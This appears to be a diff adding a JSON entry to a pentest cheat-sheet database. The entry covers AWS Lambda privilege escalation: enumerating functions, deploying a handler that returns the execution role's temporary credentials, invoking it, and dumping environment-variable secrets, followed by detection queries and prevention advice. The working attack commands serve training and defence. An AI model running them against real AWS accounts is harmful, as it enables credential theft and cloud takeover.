@@ -1,0 +1,103 @@
+{
+  "id": "aws-lambda-privesc",
+  "name": "AWS Lambda Privesc - UpdateFunctionCode + PassRole",
+  "command": "aws lambda update-function-code --function-name <target> --zip-file fileb://<file>",
+  "description": "Escalate privileges in AWS by abusing Lambda. With lambda:UpdateFunctionCode (or CreateFunction + iam:PassRole) over a function that has a higher-privileged execution role attached, overwrite the code to run attacker commands under that role and exfiltrate its temporary credentials. Lambda environment variables are also a common store of plaintext secrets.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Cloud Security",
+  "subcategory": "AWS Attacks",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "Rhino Security Labs",
+  "tags": [
+    "aws",
+    "lambda",
+    "privesc",
+    "passrole",
+    "iam",
+    "execution-role"
+  ],
+  "mitre": [
+    "T1078.004",
+    "T1098"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE TWO PATHS ===\n  1. Overwrite existing function code (lambda:UpdateFunctionCode) that already\n     has a privileged execution role -> your code runs as that role.\n  2. Create a new function (lambda:CreateFunction + iam:PassRole) and pass a\n     higher-priv role to it -> your code runs as that role.\n\n=== PERMISSIONS ===\n  Path 1: lambda:UpdateFunctionCode (+ lambda:InvokeFunction or a trigger)\n  Path 2: lambda:CreateFunction + iam:PassRole (over the target role)\n\n=== ENUMERATE FUNCTIONS + THEIR ROLES ===\n  aws lambda list-functions --query 'Functions[].{Name:FunctionName,Role:Role}'\n  aws lambda get-function-configuration --function-name <target>\n  # look for env vars holding secrets:\n  aws lambda get-function-configuration --function-name <target> --query 'Environment'\n\n=== PATH 1: HIJACK EXISTING FUNCTION ===\n  # payload (index.py) that leaks the execution-role creds:\n  cat > index.py <<'EOF'\nimport os, json, urllib.request\ndef handler(event, context):\n    c = {k: os.environ[k] for k in os.environ if k.startswith('AWS_')}\n    return json.dumps(c)\nEOF\n  zip func.zip index.py\n  aws lambda update-function-code --function-name <target> --zip-file fileb://func.zip\n  aws lambda invoke --function-name <target> out.json && cat out.json\n  # the AWS_ACCESS_KEY_ID/SECRET/SESSION_TOKEN in the output are the role's creds\n\n=== PATH 2: NEW FUNCTION WITH PASSED ROLE ===\n  aws lambda create-function --function-name pwn --runtime python3.12 \\\n    --role arn:aws:iam::<acct>:role/<priv_role> --handler index.handler \\\n    --zip-file fileb://func.zip\n  aws lambda invoke --function-name pwn out.json\n\n=== CLEANUP ===\n  Restore original code / delete the planted function.",
+  "examples": [
+    {
+      "label": "List functions and their roles",
+      "command": "aws lambda list-functions --query 'Functions[].{Name:FunctionName,Role:Role}'"
+    },
+    {
+      "label": "Overwrite code to leak role creds",
+      "command": "aws lambda update-function-code --function-name <target> --zip-file fileb://func.zip"
+    },
+    {
+      "label": "Dump secrets from env vars",
+      "command": "aws lambda get-function-configuration --function-name <target> --query 'Environment.Variables'"
+    }
+  ],
+  "references": [
+    {
+      "title": "Rhino Security Labs - AWS IAM privilege escalation methods",
+      "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+    },
+    {
+      "title": "AWS docs - Lambda execution role",
+      "url": "https://docs.aws.amazon.com/lambda/latest/dg/lambda-intro-execution-role.html"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "aws-iam-privesc-backdoor",
+      "note": "Related IAM privilege-escalation primitives.",
+      "rel": "alternative"
+    },
+    {
+      "id": "cloud-enumerate-iam",
+      "note": "Enumerate which Lambda/PassRole permissions you hold.",
+      "rel": "prereq"
+    },
+    {
+      "id": "aws-secrets-manager-dump",
+      "note": "Harvest secrets the function can read.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Lambda functions run with an execution role whose temporary credentials are placed in the function's environment. Anyone who can change the code (UpdateFunctionCode) or create a function with a passed role (CreateFunction + PassRole) controls what runs under that role and can read its credentials.",
+    "prerequisites": "IAM permission lambda:UpdateFunctionCode over a privileged function, or lambda:CreateFunction with iam:PassRole over a higher-privileged role; ability to invoke the function or an existing trigger.",
+    "impact": "Privilege escalation to the function's execution-role permissions, theft of its temporary credentials, and exposure of secrets stored in environment variables - often a jump from limited access to administrative IAM.",
+    "detection": "[MITRE T1098] CloudTrail UpdateFunctionCode / CreateFunction / UpdateFunctionConfiguration events from unusual principals; PassRole events pairing a low-priv identity with a high-priv role; invocation spikes right after a code update.",
+    "artifacts": "CloudTrail events UpdateFunctionCode20150331v2, CreateFunction20150331, UpdateFunctionConfiguration, and iam:PassRole in the request context; Lambda deployment history; CloudWatch Logs for the modified function.",
+    "splunk_spl": "index=aws sourcetype=aws:cloudtrail (eventName=UpdateFunctionCode* OR eventName=CreateFunction* OR eventName=UpdateFunctionConfiguration*)\n| stats count by userIdentity.arn, requestParameters.functionName, sourceIPAddress",
+    "elastic_kql": "event.provider:\"lambda.amazonaws.com\" and aws.cloudtrail.event_name:(UpdateFunctionCode* or CreateFunction* or UpdateFunctionConfiguration*)",
+    "sentinel_kql": "AWSCloudTrail\n| where EventName startswith \"UpdateFunctionCode\" or EventName startswith \"CreateFunction\" or EventName startswith \"UpdateFunctionConfiguration\"\n| summarize Count=count() by UserIdentityArn, SourceIpAddress, EventName",
+    "sigma_rules": "aws_lambda_update_function_code_privesc",
+    "prevention": "Restrict lambda:UpdateFunctionCode/CreateFunction and iam:PassRole with tight resource and iam:PassedToService conditions; separate deployment identities from runtime; never store secrets in Lambda env vars (use Secrets Manager/Parameter Store with KMS); enable code signing for Lambda; alert on function code changes outside CI/CD.",
+    "sources": [
+      "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/",
+      "https://docs.aws.amazon.com/lambda/latest/dg/lambda-intro-execution-role.html"
+    ],
+    "detections": [
+      {
+        "platform": "splunk",
+        "name": "Lambda code/config change followed by invoke (privesc)",
+        "logic": "index=aws sourcetype=aws:cloudtrail eventName IN (UpdateFunctionCode20150331v2, CreateFunction20150331, UpdateFunctionConfiguration20150331v2)\n| stats count values(eventName) as events by userIdentity.arn, requestParameters.functionName, sourceIPAddress",
+        "data_source": "cloud-trail",
+        "attack": [
+          "T1098",
+          "T1078.004"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Legitimate CI/CD deployment roles updating functions",
+        "tuning": "Allowlist deployment pipeline principals; alert when a human/interactive identity updates function code or passes a privileged role"
+      }
+    ]
+  }
+}
